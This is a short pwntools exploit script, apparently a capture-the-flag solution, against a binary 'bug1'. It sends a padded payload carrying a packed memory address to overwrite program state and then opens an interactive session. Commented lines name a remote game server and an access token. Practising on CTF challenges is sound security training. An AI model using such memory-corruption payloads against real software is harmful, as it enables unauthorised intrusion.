from pwn import *
context.log_level = "debug"
p = process("./bug1")
# p = remote("ctfgame.acdxvfsvd.net" , 11001)
# p.sendlineafter("Token:\n" , "zs4cYHvh7gEeFVqAj5UBFTTQvJzTAXrv")
p.sendlineafter("name:\n" , "a" * 0x8 + p64(0x60108C))
p.sendlineafter("number" , "1")
p.interactive()